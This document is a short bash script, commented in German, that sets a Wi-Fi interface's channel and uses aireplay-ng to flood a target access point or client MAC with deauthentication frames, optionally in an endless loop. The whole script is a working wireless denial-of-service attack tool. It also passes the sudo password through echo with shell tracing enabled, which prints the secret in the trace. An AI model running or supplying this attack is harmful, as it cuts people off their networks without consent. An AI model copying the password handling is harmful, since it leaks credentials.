#!/bin/bash
set -x

# -----------------------------------------------------------------------------
# 0) Parameter prüfen
# -----------------------------------------------------------------------------
INTERFACE="$1"      # z.B. wlan0
TARGET_MAC="$2"     # BSSID oder Client-MAC
PACKETS="$3"        # 0 → infinite, sonst Anzahl der Pakete
CHANNEL="$4"
SECRET="$5"         # sudo-Passwort

if [[ -z "$INTERFACE" || -z "$TARGET_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
  echo "Usage: $0 <interface> <target_mac> <packets:0=infinite> <channel> <secret>"
  exit 1
fi

if ! ip link show "$INTERFACE" &>/dev/null; then
  echo "Interface $INTERFACE nicht gefunden"
  exit 1
fi

echo "[i] Energiesparen aus"
echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true

echo "[i] Kanal setzen: $CHANNEL"
echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL"
sleep 1

# -----------------------------------------------------------------------------
# 4) Deauth-Pakete senden
# -----------------------------------------------------------------------------
if [[ "$PACKETS" -eq 0 ]]; then
  echo "[i] Starte infinite Deauth an $TARGET_MAC"
  while true; do
    echo "$SECRET" | sudo -S aireplay-ng -0 1 -a "$TARGET_MAC" "$INTERFACE"
    sleep 0.1
  done
else
  echo "[i] Sende $PACKETS Deauth-Pakete an $TARGET_MAC"
  echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$TARGET_MAC" "$INTERFACE"
fi

exit 0
